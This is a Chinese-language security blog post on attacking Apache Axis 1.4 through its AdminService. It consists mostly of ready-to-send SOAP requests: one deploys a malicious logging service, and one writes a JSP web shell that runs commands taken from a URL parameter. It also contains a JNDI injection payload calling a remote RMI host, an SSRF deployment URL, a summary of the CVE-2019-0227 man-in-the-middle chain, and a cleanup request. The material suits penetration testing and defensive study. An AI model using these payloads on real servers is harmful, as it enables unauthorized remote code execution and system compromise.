<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>攻击Axis服务的几种方式 - x1a0t&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=JAVA,GETSHELL>
  
  
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
  
  
    <link rel="alternate" href="/atom.xml " title="x1a0t&#39;s Blog" type="application/atom+xml">
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.2.0"></head>
  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">x1a0t&#39;s Blog</a>
    <div class="subtitle"></div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">Home</a>
        </li>
      
        <li class="menu-item">
          <a href="/links" class="menu-item-link">Links</a>
        </li>
      
        <li class="menu-item">
          <a href="/notes" class="menu-item-link">Notes</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">About</a>
        </li>
      
    </ul>
  </nav>
</header>
<article class="post">
  <div class="post-title">
    <h1 class="article-title">攻击Axis服务的几种方式</h1>
  </div>
   <div class="post-meta">
    <span class="post-time">2020-07-10</span>
    
      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/GETSHELL/" rel="tag">GETSHELL</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/JAVA/" rel="tag">JAVA</a></li></ul>
    
  </div>
  <div class="post-content">
    <p>axis服务被用于部署各种接口服务，而其中有个一个AdminService接口允许管理员远程访问管理服务，相关配置在<code>/axis/WEB-INF/server-config.wsdd</code>(部署应用后产生)，其中<code>enableRemoteAdmin</code>默认为<code>false</code>，只允许本地管理</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">name</span>=<span class="string">&quot;AdminService&quot;</span> <span class="attr">provider</span>=<span class="string">&quot;java:MSG&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">parameter</span> <span class="attr">name</span>=<span class="string">&quot;allowedMethods&quot;</span> <span class="attr">value</span>=<span class="string">&quot;AdminService&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">parameter</span> <span class="attr">name</span>=<span class="string">&quot;enableRemoteAdmin&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">parameter</span> <span class="attr">name</span>=<span class="string">&quot;className&quot;</span> <span class="attr">value</span>=<span class="string">&quot;org.apache.axis.utils.Admin&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">namespace</span>&gt;</span>http://xml.apache.org/axis/wsdd/<span class="tag">&lt;/<span class="name">namespace</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这种情况需要利用SSRF或者中间人攻击，先看看开启远程管理时的利用方式</p>
<h1 id="写文件getshell"><a href="#写文件getshell" class="headerlink" title="写文件getshell"></a>写文件getshell</h1><p>部署RandomService，并指定日志目录为shell路径</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /axis/services/AdminService HTTP/1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: text/xml;charset=UTF-8</span><br><span class="line">SOAPAction: &quot;&quot;</span><br><span class="line">Content-Length: 1059</span><br><span class="line">Host: 192.168.33.128:8080</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:api</span>=<span class="string">&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ns1:deployment</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns</span>=<span class="string">&quot;http://xml.apache.org/axis/wsdd/&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:java</span>=<span class="string">&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:ns1</span>=<span class="string">&quot;http://xml.apache.org/axis/wsdd/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ns1:service</span> <span class="attr">name</span>=<span class="string">&quot;RandomService&quot;</span> <span class="attr">provider</span>=<span class="string">&quot;java:RPC&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">requestFlow</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">handler</span> <span class="attr">type</span>=<span class="string">&quot;RandomLog&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">requestFlow</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ns1:parameter</span> <span class="attr">name</span>=<span class="string">&quot;className&quot;</span> <span class="attr">value</span>=<span class="string">&quot;java.util.Random&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ns1:parameter</span> <span class="attr">name</span>=<span class="string">&quot;allowedMethods&quot;</span> <span class="attr">value</span>=<span class="string">&quot;*&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ns1:service</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">handler</span> <span class="attr">name</span>=<span class="string">&quot;RandomLog&quot;</span> <span class="attr">type</span>=<span class="string">&quot;java:org.apache.axis.handlers.LogHandler&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parameter</span> <span class="attr">name</span>=<span class="string">&quot;LogHandler.fileName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;../webapps/axis/shell.jsp&quot;</span> /&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">parameter</span> <span class="attr">name</span>=<span class="string">&quot;LogHandler.writeToConsole&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span> /&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ns1:deployment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/10/Attack-Axis-Service/deployment-random.png"><br>请求RandomService，利用报错将错误日志写入到shell文件当中</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /axis/services/RandomService HTTP/1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: text/xml;charset=UTF-8</span><br><span class="line">SOAPAction: &quot;&quot;</span><br><span class="line">Content-Length: 874</span><br><span class="line">Host: 192.168.33.128:8080</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:api</span>=<span class="string">&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">api:main</span></span></span><br><span class="line"><span class="tag">        <span class="attr">soapenv:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">api:in0</span>&gt;</span>&lt;![CDATA[</span><br><span class="line">&lt;%@page import=&quot;java.util.*,java.io.*&quot;%&gt;&lt;% if (request.getParameter(&quot;c&quot;) != null) &#123; Process p = Runtime.getRuntime().exec(request.getParameter(&quot;c&quot;)); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) &#123; out.println(disr); disr = dis.readLine(); &#125;; p.destroy(); &#125;%&gt;</span><br><span class="line">]]&gt;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">api:in0</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">api:main</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/10/Attack-Axis-Service/random.png"><br>访问shell地址view-source:<a href="http://192.168.33.128:8080/axis/shell.jsp?c=ifconfig">http://192.168.33.128:8080/axis/shell.jsp?c=ifconfig</a><br><img src="/2020/07/10/Attack-Axis-Service/shell.png"><br><strong>注意：部署服务时指定的shell写入路径<code>LogHandler.fileName</code>为<code>../webapps/axis/shell.jsp</code>，是因为我本地启动tomcat时是在tomcat&#x2F;bin下启动的，但实际遇到的目标启动路径可能不同，需要根据实际对写入的路径做相应的变动</strong> </p>
<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>某大佬发现axis自带的类<code>org.apache.axis.client.ServiceFactory</code>中有一个<code>getService(</code>方法会造成JNDI注入<br><img src="/2020/07/10/Attack-Axis-Service/ServiceFactory.png"></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /axis/services/AdminService HTTP/1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: text/xml;charset=UTF-8</span><br><span class="line">SOAPAction: &quot;&quot;</span><br><span class="line">Content-Length: 746</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:api</span>=<span class="string">&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ns1:deployment</span> <span class="attr">xmlns:ns1</span>=<span class="string">&quot;http://xml.apache.org/axis/wsdd/&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xml.apache.org/axis/wsdd/&quot;</span> <span class="attr">xmlns:java</span>=<span class="string">&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ns1:service</span> <span class="attr">name</span>=<span class="string">&quot;jndiService&quot;</span> <span class="attr">provider</span>=<span class="string">&quot;java:RPC&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ns1:parameter</span> <span class="attr">name</span>=<span class="string">&quot;className&quot;</span> <span class="attr">value</span>=<span class="string">&quot;org.apache.axis.client.ServiceFactory&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ns1:parameter</span> <span class="attr">name</span>=<span class="string">&quot;allowedMethods&quot;</span> <span class="attr">value</span>=<span class="string">&quot;*&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ns1:service</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ns1:deployment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/10/Attack-Axis-Service/deployment-jndi.png"></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /axis/services/jndiService HTTP/1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: text/xml;charset=UTF-8</span><br><span class="line">SOAPAction: &quot;&quot;</span><br><span class="line">Content-Length: 874</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:buil</span>=<span class="string">&quot;http://build.antlr&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">buil:getService</span> <span class="attr">soapenv:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">environment</span> <span class="attr">xmlns:apachesoap</span>=<span class="string">&quot;http://xml.apache.org/xml-soap&quot;</span> <span class="attr">xmlns:soapenc</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;apachesoap:Map&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">key</span> <span class="attr">xsi:type</span>=<span class="string">&quot;soapenc:string&quot;</span>&gt;</span>jndiName<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">value</span> <span class="attr">xsi:type</span>=<span class="string">&quot;soapenc:string&quot;</span>&gt;</span>rmi://ip:port/exp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">buil:getService</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/10/Attack-Axis-Service/jndi.png"></p>
<h1 id="SSRF和中间人攻击"><a href="#SSRF和中间人攻击" class="headerlink" title="SSRF和中间人攻击"></a>SSRF和中间人攻击</h1><p>SSRF方式部署服务:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/axis/services/AdminService?method=!--&gt;&lt;ns1:deployment+xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot;+xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;+xmlns:ns1=&quot;http://xml.apache.org/axis/wsdd/&quot;&gt;&lt;ns1:service+name=&quot;RandomService&quot;+provider=&quot;java:RPC&quot;&gt;&lt;requestFlow&gt;&lt;handler+type=&quot;RandomLog&quot;/&gt;&lt;/requestFlow&gt;&lt;ns1:parameter+name=&quot;className&quot;+value=&quot;java.util.Random&quot;/&gt;&lt;ns1:parameter+name=&quot;allowedMethods&quot;+value=&quot;*&quot;/&gt;&lt;/ns1:service&gt;&lt;handler+name=&quot;RandomLog&quot;+type=&quot;java:org.apache.axis.handlers.LogHandler&quot;&gt;&lt;parameter+name=&quot;LogHandler.fileName&quot;+value=&quot;../webapps/axis/shell.jsp&quot;/&gt;&lt;parameter+name=&quot;LogHandler.writeToConsole&quot;+value=&quot;false&quot;/&gt;&lt;/handler&gt;&lt;/ns1:deployment</span><br></pre></td></tr></table></figure>
<p>中间人攻击原理(CVE-2019-0227):</p>
<ul>
<li>攻击者请求<a href="http://target/axis/StockQuoteService.jws">http://target/axis/StockQuoteService.jws</a></li>
<li>服务器向<a href="http://www.xmltoday.com发出请求/">www.xmltoday.com发出请求</a></li>
<li>利用中间人攻击将目标跳转目标请求，利用跳转SSRF创建恶意服务</li>
<li>利用恶意服务RCE</li>
</ul>
<h1 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:api</span>=<span class="string">&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">undeployment</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xml.apache.org/axis/wsdd/&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">service</span> <span class="attr">name</span>=<span class="string">&quot;randomService&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">handler</span> <span class="attr">name</span>=<span class="string">&quot;RandomLog&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">service</span> <span class="attr">name</span>=<span class="string">&quot;jndiService&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">undeployment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://mirror.navercorp.com/apache/axis/axis/java/1.4/">http://mirror.navercorp.com/apache/axis/axis/java/1.4/</a><br><a href="http://axis.apache.org/axis/java/apiDocs/org/apache/axis/management/ServiceAdmin.html">http://axis.apache.org/axis/java/apiDocs/org/apache/axis/management/ServiceAdmin.html</a><br><a href="http://www.lmxspace.com/2019/07/20/Axis-Rce%E5%88%86%E6%9E%90/">http://www.lmxspace.com/2019/07/20/Axis-Rce%E5%88%86%E6%9E%90/</a><br><a href="https://jianfensec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/axis%201.4%20AdminService%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20jndi%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8/">https://jianfensec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/axis%201.4%20AdminService%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20jndi%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8/</a><br><a href="https://xz.aliyun.com/t/4768">https://xz.aliyun.com/t/4768</a><br><a href="https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2019-0227">https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2019-0227</a></p>

  </div>
  <div class="post-footer">
    <a href="#top" class="top">Post.Top</a>
  </div>
</article>
<footer>
  &copy; 2024
  <span class="author">
    x1a0t
  </span>
</footer>
    </div>
  </body>
</html>